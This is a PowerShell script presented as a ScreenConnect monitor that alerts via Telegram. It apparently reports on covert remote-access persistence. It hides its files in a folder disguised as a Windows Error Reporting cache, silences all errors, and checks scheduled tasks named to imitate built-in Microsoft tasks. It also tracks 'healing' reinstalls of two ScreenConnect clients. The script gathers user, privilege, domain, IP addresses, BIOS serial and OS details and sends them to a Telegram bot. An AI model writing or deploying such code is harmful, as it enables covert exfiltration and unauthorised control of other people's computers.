#Requires -Version 5.1
# TG_REPORT BUILD 20260802T1 - rich ScreenConnect monitor Telegram alerts
param(
    [Parameter(Mandatory = $true)][string]$State,
    [Parameter(Mandatory = $true)][string]$Summary,
    [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
    [string]$OldState = ''
)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

function Get-Cfg {
    $path = Join-Path $WorkDir 'notify.cfg'
    $cfg = @{}
    if (-not (Test-Path $path)) { return $cfg }
    Get-Content -LiteralPath $path | ForEach-Object {
        if ($_ -match '^\s*([A-Za-z0-9_]+)\s*=\s*(.*)\s*$') {
            $cfg[$matches[1]] = $matches[2].Trim()
        }
    }
    return $cfg
}

function Get-PublicIp {
    foreach ($u in @(
        'https://api.ipify.org',
        'https://ifconfig.me/ip',
        'https://icanhazip.com'
    )) {
        try {
            $r = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 6
            $ip = ($r.Content | Out-String).Trim()
            if ($ip -match '^\d{1,3}(\.\d{1,3}){3}$' -or $ip -match ':') { return $ip }
        } catch {}
    }
    return 'n/a'
}

function Get-LocalIps {
    try {
        $ips = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -notlike '127.*' -and $_.PrefixOrigin -ne 'WellKnown' } |
            Select-Object -ExpandProperty IPAddress -Unique
        if ($ips) { return ($ips -join ', ') }
    } catch {}
    try {
        $ips = [System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME) |
            Where-Object { $_.AddressFamily -eq 'InterNetwork' -and $_.IPAddressToString -notlike '127.*' } |
            ForEach-Object { $_.IPAddressToString }
        if ($ips) { return ($ips -join ', ') }
    } catch {}
    return 'n/a'
}

function Get-SvcLine([string]$Name) {
    $s = Get-Service -Name $Name -ErrorAction SilentlyContinue
    if (-not $s) { return 'missing' }
    $cim = Get-CimInstance Win32_Service -Filter "Name='$Name'" -ErrorAction SilentlyContinue
    $start = if ($cim) { $cim.StartMode } else { '?' }
    return "$($s.Status) (start=$start)"
}

function Get-OsInfo {
    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
    $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
    $bios = Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue
    [pscustomobject]@{
        Caption      = if ($os) { $os.Caption } else { 'n/a' }
        Version      = if ($os) { $os.Version } else { 'n/a' }
        Build        = if ($os) { $os.BuildNumber } else { 'n/a' }
        Arch         = if ($os) { $os.OSArchitecture } else { $env:PROCESSOR_ARCHITECTURE }
        InstallDate  = if ($os -and $os.InstallDate) { $os.InstallDate.ToString('yyyy-MM-dd') } else { 'n/a' }
        LastBoot     = if ($os -and $os.LastBootUpTime) { $os.LastBootUpTime.ToString('yyyy-MM-dd HH:mm') } else { 'n/a' }
        Manufacturer = if ($cs) { $cs.Manufacturer } else { 'n/a' }
        Model        = if ($cs) { $cs.Model } else { 'n/a' }
        Domain       = if ($cs) { $cs.Domain } else { 'n/a' }
        TotalRAM_GB  = if ($cs) { [math]::Round($cs.TotalPhysicalMemory / 1GB, 1) } else { 'n/a' }
        Serial       = if ($bios) { $bios.SerialNumber } else { 'n/a' }
    }
}

$cfg = Get-Cfg
if (-not $cfg.BOT_TOKEN -or -not $cfg.CHAT_ID) { exit 0 }

$prim = 'ScreenConnect Client (5f6010579852e507)'
$alt = 'ScreenConnect Client (f861c8140d453427)'
$os = Get-OsInfo
$who = [Security.Principal.WindowsIdentity]::GetCurrent().Name
$elev = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)
$isSystem = $who -like '*SYSTEM*' -or $who -eq 'NT AUTHORITY\SYSTEM'

$msiCache = Join-Path $WorkDir 'pkg.msi'
$msiSize = if (Test-Path $msiCache) {
    '{0:N0} KB' -f ((Get-Item $msiCache).Length / 1KB)
} else { 'none' }

$emoji = switch ($State.ToUpperInvariant()) {
    'OK' { '✅' }
    'DOWN' { '🚨' }
    'RESTORED' { '🟢' }
    'FAIL' { '❌' }
    'FORCE' { '⚡' }
    default { '📟' }
}

$title = switch ($State.ToUpperInvariant()) {
    'OK' { 'Primary healthy' }
    'DOWN' { 'Primary DOWN - healing' }
    'RESTORED' { 'Primary RESTORED' }
    'FAIL' { 'Heal FAILED' }
    'FORCE' { 'Forced reinstall' }
    default { "State: $State" }
}

$trans = if ($OldState) { "$OldState → $State" } else { $State }

$scList = @()
Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' } | ForEach-Object {
    $scList += "  • $($_.Name): $($_.Status)"
}
if (-not $scList) { $scList = @('  • (none)') }

$tasks = @(
    '\Microsoft\Windows\Diagnosis\Scheduled',
    '\Microsoft\Windows\PLA\Server',
    '\Microsoft\Windows\WDI\ResolutionHost',
    '\Microsoft\Windows\Tcpip\IpAddressConflict1'
) | ForEach-Object {
    $tn = $_
    try {
        $r = schtasks.exe /Query /TN $tn /FO LIST 2>$null
        if ($LASTEXITCODE -eq 0) { "  • $tn : present" } else { "  • $tn : missing" }
    } catch { "  • $tn : missing" }
}

$pub = Get-PublicIp
$lan = Get-LocalIps
$now = Get-Date -Format 'yyyy-MM-dd HH:mm:ss zzz'

$text = @"
$emoji *SC Monitor — $title*

*Event*
• Summary: $Summary
• Transition: ``$trans``
• When: $now

*Host*
• Computer: ``$($env:COMPUTERNAME)``
• User: ``$who``
• Elevated: $elev | SYSTEM: $isSystem
• Domain/Workgroup: $($os.Domain)

*Network*
• LAN IPs: ``$lan``
• Public IP: ``$pub``

*OS / Hardware*
• OS: $($os.Caption)
• Version: $($os.Version) (build $($os.Build)) $($os.Arch)
• Install: $($os.InstallDate) | Last boot: $($os.LastBoot)
• Hardware: $($os.Manufacturer) $($os.Model)
• Serial: ``$($os.Serial)``
• RAM: $($os.TotalRAM_GB) GB

*ScreenConnect*
• Primary ``5f6010579852e507``: $(Get-SvcLine $prim)
• Alt ``f861c8140d453427``: $(Get-SvcLine $alt)
• All SC services:
$($scList -join "`n")

*Persist / Cache*
• MSI cache: $msiSize
• WorkDir: ``$WorkDir``
• Tasks:
$($tasks -join "`n")

_Bot: @nobuddyrmmBot • OWN_MON_
"@

try {
    Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") -Method Post -Body @{
        chat_id                  = $cfg.CHAT_ID
        text                     = $text
        parse_mode               = 'Markdown'
        disable_web_page_preview = 'true'
    } | Out-Null
    Add-Content -LiteralPath (Join-Path $WorkDir 'boot.err') -Value 'tg_sent_rich' -ErrorAction SilentlyContinue
} catch {
    # fallback plain text if markdown fails
    try {
        $plain = $text -replace '\*', '' -replace '`', '' -replace '_', ''
        Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") -Method Post -Body @{
            chat_id                  = $cfg.CHAT_ID
            text                     = $plain
            disable_web_page_preview = 'true'
        } | Out-Null
        Add-Content -LiteralPath (Join-Path $WorkDir 'boot.err') -Value 'tg_sent_plain' -ErrorAction SilentlyContinue
    } catch {
        Add-Content -LiteralPath (Join-Path $WorkDir 'boot.err') -Value ("tg_fail " + $_.Exception.Message) -ErrorAction SilentlyContinue
    }
}
